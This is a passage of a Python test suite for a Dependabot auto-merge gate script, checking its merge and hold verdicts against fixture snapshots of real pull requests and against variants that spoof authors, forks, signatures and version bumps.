#!/usr/bin/env python3
# SPDX-License-Identifier: MPL-2.0
"""Tests for dependabot-gate.py, its workflow and .github/dependabot.yml.

Fixtures (scripts/testdata/dependabot-gate/), so the test needs no network and
no git history: pr-189.json, pr-190.json and pr-191.json are the snapshots the
script itself took of the three Dependabot pull requests open on 2026-11-24
(`dependabot-gate.py gate --repo invowk/invowk --pr N --snapshot-out FILE`). A
snapshot holds only the fields the rules read. They are unedited except for
two things:
  - a reduction, made by `python3 scripts/test_dependabot_gate.py
    reduce-fixture FILE` (reduce_lockfiles below): website/package-lock.json
    is about 750 kB on each side, and the lockfile rule reads only the
    entries that differ between base and head, so the fixture keeps those
    entries and every field outside `packages`, re-serialised with two-space
    indentation. go.mod and website/package.json are whole;
  - the `id` of every check run and workflow run, and the `jobs` of the runs
    of a required workflow file. The script did not read them when the
    snapshots were taken. They were added later on 2026-11-24, for the same
    three head commits, from the same read-only endpoints through the
    script's own readers (`fetch_all` with `_check_run_fields` and
    `_workflow_run_fields`): the API still returned exactly the check runs
    and workflow runs of each fixture, and each entry got the new fields of
    the one API entry equal to it in every other field. By then Dependabot
    had closed #189 and #190 (and opened #193 and #194 in their place) and
    rebased #191, so the snapshots could not simply be taken again;
  - the run fields the review of PR #197 asked for: each workflow run's
    `run_attempt`, `conclusion`, `repository.id` and `head_repository.id`,
    each job's `run_attempt`, `conclusion` and the conclusion of each step,
    and the check runs of each required run's check suite (`filter=all`).
    They were added on 2026-11-24 the same way, with GET requests through
    the script's own `_workflow_run_fields`, for the same run ids. Every
    field the fixtures had already (the `filter=latest` check runs, the
    workflow run ids, paths, events, suites and actors, the job ids,
    runners and step counts) came back unchanged, and the check runs of
    each suite are exactly its run's jobs (same ids). Every run is attempt
    1, on this repository's branch.

All three were taken after #188 merged, so each head is one commit behind
main, which is a hold of its own. Expected verdicts:
  - #189 (npm): hold, typescript 6 -> 7 is a major update;
  - #190 (gomod): hold, failing checks and coder/acp-go-sdk 0.13.5 -> 0.20.0
    (a 0.x minor that broke the build). Its nine side effects in go.mod, all
    on indirect requirements its metadata does not name (SIDE_EFFECTS), held
    under the strict rules and are admitted by `indirect-side-effect`;
  - #191 (github-actions): hold, not an ecosystem the gate merges.

The jobs of #190 and #191 show why a check suite is not enough to bind a
check to a job: the four `JUnit Report (...)` checks that ci.yml's test job
created through the API (it publishes them from the `test-report` job now)
are listed as jobs, and as check runs of the suite, of the lint.yml run on
#190 and of the codeql.yml run on #191, with no runner and no steps.

The rule tests start from two derived snapshots that merge, with nothing
admitted by a relaxation, and change one thing each:
  - `green_gomod`: #190 up to date with main, its failed checks, runs, jobs
    and steps passing (pass_failures), with
    only the nine named patch and minor updates and the six indirect patch
    and minor side effects (GREEN_GOMOD) left in go.mod;
  - `green_npm`: #189 up to date with main, without typescript.
Every rule was calibrated by removing it from the script and watching its test
fail.

The policy tables are checked against the live repository (go.mod,
website/package.json, the workflow files, .github/dependabot.yml), so a
renamed job or a dropped dependency fails here.
"""

from __future__ import annotations

import contextlib
import copy
import fnmatch
import importlib.util
import io
import json
import re
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.dont_write_bytecode = True
HERE = Path(__file__).resolve().parent
ROOT = HERE.parent
FIXTURES = HERE / "testdata" / "dependabot-gate"
WORKFLOWS = ROOT / ".github" / "workflows"
GATE_WORKFLOW = WORKFLOWS / "dependabot-gate.yml"
DEPENDABOT_CONFIG = ROOT / ".github" / "dependabot.yml"
REPO = "invowk/invowk"
REPO_ID = 1130617195
GUARD = "env.GATE_MODE == 'merge' && steps.decide.outputs.decision == 'merge'"
GO_MOD, PACKAGE_JSON, PACKAGE_LOCK = "go.mod", "website/package.json", "website/package-lock.json"

# What #190 changes in go.mod and the gate accepts: the nine updates its
# metadata names (all but acp-go-sdk) and six indirect side effects that are
# patch or minor updates of released versions.
GREEN_GOMOD = {
    "charm.land/bubbletea/v2",
    "charm.land/lipgloss/v2",
    "charm.land/log/v2",
    "charm.land/wish/v2",
    "github.com/bmatcuk/doublestar/v4",
    "github.com/go-git/go-git/v5",
    "github.com/openai/openai-go/v3",
    "github.com/spf13/pflag",
    "mvdan.cc/sh/v3",
    "github.com/ProtonMail/go-crypto",
    "github.com/charmbracelet/x/ansi",
    "github.com/cloudflare/circl",
    "github.com/go-git/go-billy/v5",
    "github.com/skeema/knownhosts",
    "github.com/tidwall/gjson",
}
# What else #190 changes in go.mod: nine indirect requirements, none named in
# its metadata. The strict rules held every one (finding H1 of the PR #192
# review: a pseudo-version, an added and a removed requirement, 0.x minors, a
# 0.0.z version). `indirect-side-effect` admits them, each with this line.
SIDE_EFFECTS = {
    "github.com/charmbracelet/ultraviolet": '"v0.0.0-20260811164956-006e29f97886" -> "v0.0.0-20261008173134-6b8d4baf91b4"',
    "github.com/coder/websocket": 'go.mod adds the indirect requirement "github.com/coder/websocket v1.8.15"',
    "github.com/cyphar/filepath-securejoin": '"v0.6.1" -> "v0.7.0"',
    "github.com/klauspost/cpuid/v2": 'go.mod removes the indirect requirement "github.com/klauspost/cpuid/v2 v2.3.0"',
    "github.com/mattn/go-runewidth": '"v0.0.28" -> "v0.0.30"',
    "github.com/pires/go-proxyproto": '"v0.12.0" -> "v0.15.0"',
    "github.com/pjbgf/sha1cd": '"v0.6.0" -> "v0.7.0"',
    "github.com/xo/terminfo": '"v0.0.0-20220910002029-abceb7e1c41e" -> "v1.2.0"',
    "golang.org/x/exp": '"v0.0.0-20260508232706-74f9aab9d74a" -> "v0.0.0-20260908205506-85c1c2202aba"',
}
BY_INDIRECT = ": admitted by indirect-side-effect"
# The same rule on a step from v0 to v1, which it names (finding S2 of the PR #197 review).
CROSSES_V0_V1 = BY_INDIRECT + " (crosses v0 to v1)"
BY_0X_MINOR = ": admitted by allow-0x-minor"
ACP = "github.com/coder/acp-go-sdk"
GO_REQUIRE_LINE = re.compile(r"\t(\S+) v\S+( // indirect)?")


def load(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    sys.modules[name] = module  # dataclasses resolve annotations through it
    spec.loader.exec_module(module)
    return module


GATE = load("dependabot_gate", HERE / "dependabot-gate.py")
subprocess_run = subprocess.run  # the real one, for a test that patches the script's
# The block-style YAML reader the parity check already tests; flow values
# such as `{}` come back as their text.
load_yaml = load("check_ci_release_parity", HERE / "check-ci-release-parity.py").load_yaml


def real(number: int) -> dict:
    return json.loads((FIXTURES / f"pr-{number}.json").read_text(encoding="utf-8"))


def file_entry(snapshot: dict, filename: str) -> dict:
    (entry,) = [entry for entry in snapshot["files"] if entry["filename"] == filename]
    return entry


def drop_metadata(snapshot: dict, name: str) -> None:
    """Remove one dependency from the head commit's metadata block."""
    commit = snapshot["commits"][0]["commit"]
    kept: list[str] = []
    skipping = False
    for line in commit["message"].split("\n"):
        if line.startswith("- dependency-name: "):
            skipping = line == f"- dependency-name: {name}"
        elif not line.startswith("  "):
            skipping = False
        if not skipping:
            kept.append(line)
    assert len(kept) < len(commit["message"].split("\n")), name
    commit["message"] = "\n".join(kept)


def go_changes(snapshot: dict) -> set[str]:
    """The modules whose go.mod requirement differs between base and head."""
    entry = file_entry(snapshot, GO_MOD)
    old, new = GATE.parse_go_mod(entry["base"])[0], GATE.parse_go_mod(entry["head"])[0]
    return {module for module in set(old) | set(new) if old.get(module) != new.get(module)}


def keep_go_changes(snapshot: dict, modules: set[str]) -> None:
    """Rebuild the head go.mod as the base with only these modules' head lines."""
    entry = file_entry(snapshot, GO_MOD)
    head = {m.group(1): line for line in entry["head"].split("\n") if (m := GO_REQUIRE_LINE.fullmatch(line))}
    lines = []
    for line in entry["base"].split("\n"):
        match = GO_REQUIRE_LINE.fullmatch(line)
        lines.append(head[match.group(1)] if match and match.group(1) in modules else line)
    entry["head"] = "\n".join(lines)
    assert go_changes(snapshot) == modules, go_changes(snapshot) ^ modules


def set_go_version(snapshot: dict, module: str, version: str, side: str = "head") -> None:
    """Rewrite the version of one requirement line of go.mod, on one side."""
    entry = file_entry(snapshot, GO_MOD)
    pattern = re.compile(rf"(?m)^\t{re.escape(module)} v\S+( // indirect)?$")
    assert len(pattern.findall(entry[side])) == 1, module
    entry[side] = pattern.sub(lambda match: f"\t{module} {version}{match.group(1) or ''}", entry[side])


def add_go_line(snapshot: dict, line: str, side: str = "head") -> None:
    """Add one line at the top of the first require block of go.mod."""
    entry = file_entry(snapshot, GO_MOD)
    assert entry[side].count("require (\n") == 2
    entry[side] = entry[side].replace("require (\n", f"require (\n{line}\n", 1)


def set_metadata_version(snapshot: dict, name: str, version: str) -> None:
    pattern = re.compile(rf"(- dependency-name: {re.escape(name)}\n  dependency-version: )\S+")
    assert len(pattern.findall(message_of(snapshot))) == 1, name
    set_message(snapshot, pattern.sub(lambda match: match.group(1) + version, message_of(snapshot)))


def add_metadata(snapshot: dict, name: str, version: str, update_type: str = "version-update:semver-minor", kind: str = "direct:production") -> None:
    """Name one more dependency in the head commit's metadata block."""
    item = f"- dependency-name: {name}\n  dependency-version: {version}\n  dependency-type: {kind}\n  update-type: {update_type}\n"
    assert message_of(snapshot).count("\n...\n") == 1
    set_message(snapshot, message_of(snapshot).replace("\n...\n", f"\n{item}...\n"))


def rebump(snapshot: dict, module: str, old: str, new: str) -> None:
    """Make a named update of green_gomod go from `old` to `new`, in go.mod and in the metadata."""
    set_go_version(snapshot, module, old, side="base")
    set_go_version(snapshot, module, new)
    set_metadata_version(snapshot, module, new.removeprefix("v"))


def edit_json(snapshot: dict, filename: str, edit, side: str = "head") -> None:
    """Apply `edit` to the parsed JSON of one side of a file and store it again."""
    entry = file_entry(snapshot, filename)
    document = json.loads(entry[side])
    edit(document)
    entry[side] = json.dumps(document, indent=2) + "\n"


def lock_entry(version: str, name: str = "left-pad", **fields: object) -> dict:
    """A lockfile entry as npm writes it for a registry package."""
    basename = name.rsplit("/", 1)[-1]
    return {
        "version": version,
        "resolved": f"https://registry.npmjs.org/{name}/-/{basename}-{version}.tgz",
        "integrity": "sha512-" + "A" * 86 + "==",
        **fields,
    }


def pass_failures(snapshot: dict) -> None:
    """Turn every failure into a success: check runs, workflow runs, their jobs and steps."""
    runs = snapshot["workflow_runs"]
    checks = snapshot["check_runs"] + [check for run in runs for check in run.get("check_runs", [])]
    for record in checks + runs + [job for run in runs for job in run.get("jobs", [])]:
        if record["conclusion"] == "failure":
            record["conclusion"] = "success"
    for job in [job for run in runs for job in run.get("jobs", [])]:
        job["steps"] = ["success" if step == "failure" else step for step in job["steps"]]


def green_gomod() -> dict:
    snapshot = real(190)
    snapshot["compare"]["behind_by"] = 0
    drop_metadata(snapshot, ACP)
    keep_go_changes(snapshot, GREEN_GOMOD)
    pass_failures(snapshot)
    return snapshot


def green_npm() -> dict:
    snapshot = real(189)
    snapshot["compare"]["behind_by"] = 0
    drop_metadata(snapshot, "typescript")
    edit_json(snapshot, PACKAGE_JSON, lambda package: package["devDependencies"].update(typescript="~6.0.3"))
    base = json.loads(file_entry(snapshot, PACKAGE_LOCK)["base"])["packages"]

    def without_typescript(lock: dict) -> None:
        packages = lock["packages"]
        for key in [key for key in packages if key.startswith("node_modules/@typescript/")]:
            del packages[key]
        packages["node_modules/typescript"] = base["node_modules/typescript"]
        packages[""]["devDependencies"]["typescript"] = "~6.0.3"

    edit_json(snapshot, PACKAGE_LOCK, without_typescript)
    return snapshot


def message_of(snapshot: dict) -> str:
    return snapshot["commits"][0]["commit"]["message"]


def set_message(snapshot: dict, message: str) -> None:
    snapshot["commits"][0]["commit"]["message"] = message


def run_named(snapshot: dict, name: str) -> dict:
    (run,) = [run for run in snapshot["check_runs"] if run["name"] == name]
    return run


def workflow_run(snapshot: dict, workflow: str) -> dict:
    (run,) = [run for run in snapshot["workflow_runs"] if run["path"] == GATE.WORKFLOW_FILES[workflow]]
    return run


def suite_check(snapshot: dict, name: str) -> dict:
    """The check run of `name` in the check suite of the required run that reports it."""
    (check,) = [check for run in snapshot["workflow_runs"] for check in run.get("check_runs", []) if check["name"] == name]
    return check


def job_for(snapshot: dict, name: str) -> dict:
    """The job behind the check run of `name` in its run's check suite (same id)."""
    check = suite_check(snapshot, name)
    (job,) = [job for run in snapshot["workflow_runs"] for job in run.get("jobs", []) if job["id"] == check["id"]]
    return job


FORK = 10**6  # id offset of the runs, jobs and check runs fork_run makes
RERUN = 2 * 10**6  # id offset of the jobs and check runs of a re-run attempt


def fork_run(snapshot: dict, workflow: str, actor: int = 12345, fork: int | None = 7) -> dict:
    """An approved run of `workflow` for a fork's pull request with the head commit: Dependabot's run under new ids."""
    run = copy.deepcopy(workflow_run(snapshot, workflow))
    run.update(id=run["id"] + FORK, check_suite_id=run["check_suite_id"] + FORK, actor={"id": actor}, head_repository={"id": fork})
    for record in run["jobs"] + run["check_runs"]:
        record["id"] += FORK
    for check in run["check_runs"]:
        check["check_suite"] = {"id": run["check_suite_id"]}
    return run


def replace_with_fork_checks(snapshot: dict, run: dict, conclusion: str) -> None:
    """List the run's later checks in place of the same-named ones (`filter=latest`), with `conclusion`."""
    names = {check["name"] for check in run["check_runs"]}
    snapshot["check_runs"] = [check for check in snapshot["check_runs"] if check["name"] not in names]
    snapshot["check_runs"] += [dict(copy.deepcopy(check), conclusion=conclusion) for check in run["check_runs"]]


def rerun(snapshot: dict, workflow: str) -> dict:
    """Re-run `workflow`: a second attempt whose jobs all have new ids, in the same suite, listed in place of the first."""
    run = workflow_run(snapshot, workflow)
    run["run_attempt"] = 2
    run["jobs"] += [dict(copy.deepcopy(job), id=job["id"] + RERUN, run_attempt=2) for job in run["jobs"]]
    run["check_runs"] += [dict(copy.deepcopy(check), id=check["id"] + RERUN) for check in run["check_runs"]]
    for check in snapshot["check_runs"]:
        if check["check_suite"]["id"] == run["check_suite_id"]:
            check["id"] += RERUN
    return run


def reduce_lockfiles(snapshot: dict) -> None:
    """Keep, in each lockfile, only what the lockfile rule reads (see the module docstring)."""
    for entry in snapshot["files"]:
        if entry["filename"] != PACKAGE_LOCK or "base" not in entry:
            continue
        base, head = json.loads(entry["base"]), json.loads(entry["head"])
        differing = {key for key in set(base["packages"]) | set(head["packages"]) if base["packages"].get(key) != head["packages"].get(key)}
        for side, lock in (("base", base), ("head", head)):
            lock["packages"] = {key: value for key, value in lock["packages"].items() if key in differing}
            entry[side] = json.dumps(lock, indent=2) + "\n"


class GateTestCase(unittest.TestCase):
    def assert_merges(self, snapshot: dict, *admitted: str) -> dict:
        """Merge, with one `admitted` line per fragment and no other."""
        verdict = GATE.decide(snapshot)
        self.assertEqual((verdict["decision"], verdict["reasons"]), ("merge", []))
        self.assert_admitted(verdict, *admitted)
        return verdict

    def assert_admitted(self, verdict: dict, *fragments: str) -> None:
        for fragment in fragments:
            self.assertTrue(any(fragment in line for line in verdict["admitted"]), (fragment, verdict["admitted"]))
        self.assertEqual(len(verdict["admitted"]), len(fragments), verdict["admitted"])

    def assert_holds(self, snapshot: object, *fragments: str, only: bool = True) -> dict:
        """Hold, with one reason per fragment (and no other reason when `only`)."""
        verdict = GATE.decide(snapshot)
        self.assertEqual(verdict["decision"], "hold", verdict)
        for fragment in fragments:
            self.assertTrue(any(fragment in reason for reason in verdict["reasons"]), (fragment, verdict["reasons"]))
        if only:
            self.assertEqual(len(verdict["reasons"]), len(fragments), verdict["reasons"])
        return verdict


class RealPullRequestTests(GateTestCase):
    BEHIND = "the head is behind main (by 1), so its checks tested an older base"

    def test_189_holds_on_the_typescript_major(self) -> None:
        verdict = self.assert_holds(
            real(189),
            self.BEHIND,
            'website/package.json: "typescript" "~6.0.3" -> "~7.0.2" is a major update',
            'website/package-lock.json: "node_modules/typescript" "6.0.3" -> "7.0.2" is a major update',
            '"typescript": update type "version-update:semver-major" is not semver-patch or semver-minor',
        )
        self.assertEqual((verdict["pull_request"], verdict["ecosystem"]), (189, "npm"))
        self.assertEqual([dep["dependency-name"] for dep in verdict["dependencies"]], ["react", "react-dom", "typescript"])

    def test_190_holds_on_failing_checks_and_the_0x_minor(self) -> None:
        verdict = self.assert_holds(
            real(190),
            self.BEHIND,
            'go.mod: "github.com/coder/acp-go-sdk" "v0.13.5" -> "v0.20.0" is a minor bump of a 0.x version',
            '"github.com/coder/acp-go-sdk": a minor bump to 0.20.0 is a 0.x release, treated as breaking',
            'check "Test (windows)" ("github-actions") concluded "failure"',
            'check "govulncheck" ("github-actions") concluded "failure"',
            'check "goplint consumer gates" ("github-actions") concluded "failure"',
            only=False,
        )
        self.assertEqual(len(verdict["reasons"]), 23, verdict["reasons"])
        self.assertEqual(len([reason for reason in verdict["reasons"] if reason.startswith("check ")]), 11)
        # The runs behind the required checks failed, and so did seven of the jobs they bind.
        self.assertIn("Dependabot's run 45145297237 of .github/workflows/ci.yml, behind required checks, concluded \"failure\"", verdict["reasons"])
        self.assertIn("Dependabot's run 45145297215 of .github/workflows/lint.yml, behind required checks, concluded \"failure\"", verdict["reasons"])
        self.assertEqual(len([reason for reason in verdict["reasons"] if ': its check run concluded "failure"' in reason]), 7)
        self.assertEqual((verdict["pull_request"], verdict["ecosystem"]), (190, "gomod"))
        self.assertEqual(len(verdict["dependencies"]), 10)
        # A hold still says which lines a relaxation let through.
        self.assert_admitted(verdict, *SIDE_EFFECTS.values())

    def side_effects_of_190(self) -> dict:
        """#190's own go.mod without the acp-go-sdk bump, main caught up, every check green."""
        snapshot = green_gomod()
        file_entry(snapshot, GO_MOD)["head"] = file_entry(real(190), GO_MOD)["head"]
        self.assertEqual(go_changes(snapshot), GREEN_GOMOD | set(SIDE_EFFECTS) | {ACP})
        set_go_version(snapshot, ACP, "v0.13.5")
        return snapshot

    def test_190_side_effects_are_admitted_by_the_indirect_rule(self) -> None:
        # Relaxation (a) on the real pull request: the nine indirect side
        # effects that held it under the strict rules (finding H1).
        verdict = self.assert_merges(self.side_effects_of_190(), *SIDE_EFFECTS.values())
        for module, line in SIDE_EFFECTS.items():
            with self.subTest(module=module):
                (admitted,) = [text for text in verdict["admitted"] if module in text]
                self.assertIn(line, admitted)
                self.assertTrue(admitted.endswith(CROSSES_V0_V1 if module == "github.com/xo/terminfo" else BY_INDIRECT), admitted)
        self.assertEqual(GATE.RULE_INDIRECT, "indirect-side-effect")

    def test_190_side_effect_named_in_the_metadata_is_classified_strictly(self) -> None:
        # The relaxation is for what the metadata does not name: once it
        # does, the step is an update someone chose.
        snapshot = self.side_effects_of_190()
        add_metadata(snapshot, "github.com/cyphar/filepath-securejoin", "0.7.0", kind="indirect")
        verdict = self.assert_holds(
            snapshot,
            'go.mod: "github.com/cyphar/filepath-securejoin" "v0.6.1" -> "v0.7.0" is a minor bump of a 0.x version',
            '"github.com/cyphar/filepath-securejoin": a minor bump to 0.7.0 is a 0.x release',
        )
        self.assertEqual(len(verdict["admitted"]), len(SIDE_EFFECTS) - 1)

    def test_191_holds_because_github_actions_updates_never_merge(self) -> None:
        verdict = self.assert_holds(
            real(191),
            self.BEHIND,
            'the head branch "dependabot/github_actions/github-actions-5f5cef2c17" is not a gomod or npm',
            only=False,
        )
        self.assertIsNone(verdict["ecosystem"])

    def test_fixtures_are_the_reduced_snapshots(self) -> None:
        for number in (189, 190, 191):
            with self.subTest(pr=number):
                snapshot = real(number)
                reduce_lockfiles(snapshot)
                self.assertEqual(snapshot, real(number))
                self.assertEqual(snapshot["compare"], {"behind_by": 1, "merge_base_sha": "f895970f71f3fedaa1dfdde78e6f19cde5ab9e1c"})
        self.assertEqual(sorted(entry["filename"] for entry in real(189)["files"] if "base" in entry), [PACKAGE_LOCK, PACKAGE_JSON])
        self.assertEqual([entry["filename"] for entry in real(190)["files"] if "base" in entry], [GO_MOD])
        self.assertEqual([entry for entry in real(191)["files"] if "base" in entry or "head" in entry], [])
        # The bound: the largest, #190, is about 68 kB with its runs' jobs and check runs.
        self.assertLess(max(path.stat().st_size for path in FIXTURES.glob("pr-*.json")), 80_000)


class GreenBaselineTests(GateTestCase):
    def test_all_green_patch_and_minor_gomod_update_merges(self) -> None:
        snapshot = green_gomod()
        verdict = self.assert_merges(snapshot)
        self.assertEqual((verdict["pull_request"], verdict["ecosystem"]), (190, "gomod"))
        self.assertEqual(verdict["head_sha"], "862bccdff65c5b51281858c8c9c6b2f716c032b0")
        self.assertEqual(len(verdict["dependencies"]), 9)
        self.assertEqual({dep["update-type"] for dep in verdict["dependencies"]}, set(GATE.ALLOWED_UPDATE_TYPES))
        self.assertEqual(go_changes(snapshot), GREEN_GOMOD)
        self.assertLess({dep["dependency-name"] for dep in verdict["dependencies"]}, GREEN_GOMOD)

    def test_all_green_minor_npm_update_merges(self) -> None:
        snapshot = green_npm()
        verdict = self.assert_merges(snapshot)
        self.assertEqual((verdict["pull_request"], verdict["ecosystem"]), (189, "npm"))
        lock = file_entry(snapshot, PACKAGE_LOCK)
        base, head = json.loads(lock["base"])["packages"], json.loads(lock["head"])["packages"]
        # react-dom 19.3.1 brings scheduler 0.28.0: a transitive package is
        # judged by where it comes from, not by its version step.
        self.assertEqual(
            sorted(key for key in head if head[key] != base.get(key)),
            ["", "node_modules/react", "node_modules/react-dom", "node_modules/scheduler"],
        )

    def test_reduced_lockfile_decides_like_the_whole_one(self) -> None:
        # The reduction of the fixtures drops only entries the rule skips.
        def grow(lock: dict) -> None:
            lock["packages"]["node_modules/unchanged"] = {"version": "1.0.0", "resolved": "git+ssh://example.com/x.git"}

        for change, decision in ((lambda lock: None, "merge"), (lambda lock: lock["packages"]["node_modules/react"].update(resolved="x"), "hold")):
            with self.subTest(decision=decision):
                whole = green_npm()
                for side in ("base", "head"):
                    edit_json(whole, PACKAGE_LOCK, grow, side=side)
                edit_json(whole, PACKAGE_LOCK, change)
                reduced = copy.deepcopy(whole)
                reduce_lockfiles(reduced)
                self.assertNotIn("node_modules/unchanged", file_entry(reduced, PACKAGE_LOCK)["head"])
                self.assertEqual(GATE.decide(whole), GATE.decide(reduced))
                self.assertEqual(GATE.decide(whole)["decision"], decision)


class PullRequestRuleTests(GateTestCase):
    def test_author_must_be_the_dependabot_bot(self) -> None:
        for field, value in (("login", "mallory"), ("id", 1), ("type", "User")):
            with self.subTest(field=field):
                snapshot = green_gomod()
                snapshot["pull_request"]["user"][field] = value
                self.assert_holds(snapshot, "the pull request author is")

    def test_base_must_be_main(self) -> None:
        snapshot = green_gomod()
        snapshot["pull_request"]["base"]["ref"] = "release"
        self.assert_holds(snapshot, 'the base branch is "release"')

    def test_base_must_be_this_repository(self) -> None:
        snapshot = green_gomod()
        snapshot["pull_request"]["base"]["repo"]["full_name"] = "mallory/invowk"
        self.assert_holds(snapshot, "the base repository is")

    def test_fork_head_holds(self) -> None:
        for head_repo in ({"full_name": "mallory/invowk"}, None):
            with self.subTest(head_repo=head_repo):
                snapshot = green_gomod()
                snapshot["pull_request"]["head"]["repo"] = head_repo
                self.assert_holds(snapshot, "(a fork)")

    def test_closed_holds(self) -> None:
        snapshot = green_gomod()
        snapshot["pull_request"]["state"] = "closed"
        self.assert_holds(snapshot, 'the pull request is "closed", not open')

    def test_draft_holds(self) -> None:
        for draft in (True, None):
            with self.subTest(draft=draft):
                snapshot = green_gomod()
                snapshot["pull_request"]["draft"] = draft
                self.assert_holds(snapshot, "the pull request is a draft")

    def test_merge_conflict_holds(self) -> None:
        for mergeable in (False, None, "true"):
            with self.subTest(mergeable=mergeable):
                snapshot = green_gomod()
                snapshot["pull_request"]["mergeable"] = mergeable
                self.assert_holds(snapshot, "does not report the pull request as mergeable")
        for state in ("dirty", "behind", "unknown", "draft", "something-new", None):
            with self.subTest(state=state):
                snapshot = green_gomod()
                snapshot["pull_request"]["mergeable_state"] = state
                self.assert_holds(snapshot, "merge state is")
        for state in sorted(GATE.MERGEABLE_STATES):
            with self.subTest(state=state):
                snapshot = green_gomod()
                snapshot["pull_request"]["mergeable_state"] = state
                self.assert_merges(snapshot)

    def test_hold_label_holds(self) -> None:
        for name in ("hold", "HOLD", "do-not-merge", "Do-Not-Merge"):
            with self.subTest(label=name):
                snapshot = green_gomod()
                snapshot["pull_request"]["labels"] = [{"name": "dependencies"}, {"name": name}]
                self.assert_holds(snapshot, "the pull request has the label")
        snapshot = green_gomod()
        snapshot["pull_request"]["labels"] = [{"name": "dependencies"}, {"name": "go"}, {"name": "on-hold-list"}]
        self.assert_merges(snapshot)

    def test_unreadable_labels_hold(self) -> None:
        snapshot = green_gomod()
        snapshot["pull_request"]["labels"] = None
        self.assert_holds(snapshot, "labels could not be read")
        snapshot = green_gomod()
        snapshot["pull_request"]["labels"] = ["hold"]
        self.assert_holds(snapshot, "a pull request label has no name")

    def test_number_must_be_an_integer(self) -> None:
        for number in ("190", None, 0, True):
            with self.subTest(number=number):
                snapshot = green_gomod()
                snapshot["pull_request"]["number"] = number
                self.assert_holds(snapshot, "pull request number not understood")

    def test_head_sha_mismatch_holds(self) -> None:
        snapshot = green_gomod()
        snapshot["head_sha"] = "0" * 40
        self.assert_holds(snapshot, "but the pull request head is now")

    def test_malformed_triggering_sha_holds(self) -> None:
        for sha in ("main", "862bccd", "", None, "862BCCDFF65C5B51281858C8C9C6B2F716C032B0"):
            with self.subTest(sha=sha):
                snapshot = green_gomod()
                snapshot["head_sha"] = sha
                verdict = self.assert_holds(snapshot, "the triggering head SHA is not a commit SHA")
                self.assertIsNone(verdict["head_sha"])


class UpToDateRuleTests(GateTestCase):
    """Finding H2: `mergeable_state` never says "behind" under this ruleset."""

    def test_head_behind_main_holds(self) -> None:
        for behind in (1, 7):
            for state in sorted(GATE.MERGEABLE_STATES):
                with self.subTest(behind=behind, state=state):
                    snapshot = green_gomod()
                    snapshot["compare"]["behind_by"] = behind
                    snapshot["pull_request"]["mergeable_state"] = state
                    self.assert_holds(snapshot, f"the head is behind main (by {behind}), so its checks tested an older base")

    def test_unreadable_compare_holds(self) -> None:
        for behind in (None, "0", True, False, 0.0, [0]):
            with self.subTest(behind=behind):
                snapshot = green_gomod()
                snapshot["compare"]["behind_by"] = behind
                self.assert_holds(snapshot, "how far the head is behind main could not be read")
        snapshot = green_gomod()
        snapshot["compare"]["behind_by"] = -1
        self.assert_holds(snapshot, "the head is behind main (by -1)")
        snapshot = green_gomod()
        snapshot["compare"] = None
        self.assert_holds(snapshot, "how far the head is behind main could not be read", "the merge base with main")

    def test_merge_base_must_be_a_commit(self) -> None:
        for sha in (None, "main", "f895970"):
            with self.subTest(sha=sha):
                snapshot = green_gomod()
                snapshot["compare"]["merge_base_sha"] = sha
                self.assert_holds(snapshot, "the merge base with main (where the base file contents are read) is not a commit SHA")


class CommitRuleTests(GateTestCase):
    def test_commit_by_someone_else_holds(self) -> None:
        for field, value in (("login", "mallory"), ("id", 1)):
            with self.subTest(field=field):
                snapshot = green_gomod()
                snapshot["commits"][0]["author"][field] = value
                self.assert_holds(snapshot, "is authored by")
        snapshot = green_gomod()
        snapshot["commits"][0]["author"] = None
        self.assert_holds(snapshot, "is authored by")

    def test_commit_committed_by_someone_else_holds(self) -> None:
        # A person who signs with their own key and sets Dependabot as author.
        for committer in ({"login": "mallory", "id": 1}, {"login": "web-flow", "id": 1}, None):
            with self.subTest(committer=committer):
                snapshot = green_gomod()
                snapshot["commits"][0]["committer"] = committer
                self.assert_holds(snapshot, "is committed by")
        # No real Dependabot commit has the bot as committer: not accepted.
        snapshot = green_gomod()
        snapshot["commits"][0]["committer"] = {"login": "dependabot[bot]", "id": 49699333}
        self.assert_holds(snapshot, "is committed by")

    def test_unverified_commit_holds(self) -> None:
        for verification in ({"verified": False, "reason": "unsigned"}, {"verified": "true"}, {}, None):
            with self.subTest(verification=verification):
                snapshot = green_gomod()
                snapshot["commits"][0]["commit"]["verification"] = verification
                self.assert_holds(snapshot, "has no verified signature")

    def test_second_commit_holds(self) -> None:
        snapshot = green_gomod()
        human = copy.deepcopy(snapshot["commits"][0])
        human.update(sha="1" * 40, author={"login": "mallory", "id": 1}, committer={"login": "mallory", "id": 1})
        snapshot["commits"].append(human)
        snapshot["pull_request"]["commits"] = 2
        self.assert_holds(
            snapshot,
            "expected exactly one commit (Dependabot's), found 2",
            "is authored by",
            "is committed by",
            "the last commit listed is not the pull request head",
        )

    def test_two_dependabot_commits_hold(self) -> None:
        # Only the head commit's metadata is read, so a second commit holds
        # even when it is Dependabot's own.
        snapshot = green_gomod()
        first = copy.deepcopy(snapshot["commits"][0])
        first["sha"] = "1" * 40
        snapshot["commits"].insert(0, first)
        snapshot["pull_request"]["commits"] = 2
        self.assert_holds(snapshot, "expected exactly one commit (Dependabot's), found 2")

    def test_incomplete_commit_list_holds(self) -> None:
        snapshot = green_gomod()
        snapshot["pull_request"]["commits"] = 2
        self.assert_holds(snapshot, "does not match the pull request's commit count")
        snapshot = green_gomod()
        snapshot["commits"] = []
        self.assert_holds(snapshot, "expected exactly one commit", "commit count", "head commit message", only=False)

    def test_listed_commit_must_be_the_head(self) -> None:
        snapshot = green_gomod()
        snapshot["commits"][0]["sha"] = "1" * 40
        self.assert_holds(snapshot, "the last commit listed is not the pull request head", "head commit message", only=False)


class MetadataRuleTests(GateTestCase):
    def test_missing_block_holds(self) -> None:
        snapshot = green_gomod()
        set_message(snapshot, "deps(go): bump something\n\nSigned-off-by: dependabot[bot] <support@github.com>")
        self.assert_holds(snapshot, "metadata of the head commit is missing or unreadable", "update types", only=False)

    def test_unparseable_block_holds(self) -> None:
        snapshot = green_gomod()
        set_message(snapshot, message_of(snapshot).replace("  update-type: ", "  update-type:\n    nested: "))
        self.assert_holds(snapshot, "metadata of the head commit is missing or unreadable", "update types", only=False)

    def test_major_update_holds(self) -> None:
        snapshot = green_gomod()
        set_message(snapshot, message_of(snapshot).replace("version-update:semver-patch", "version-update:semver-major", 1))
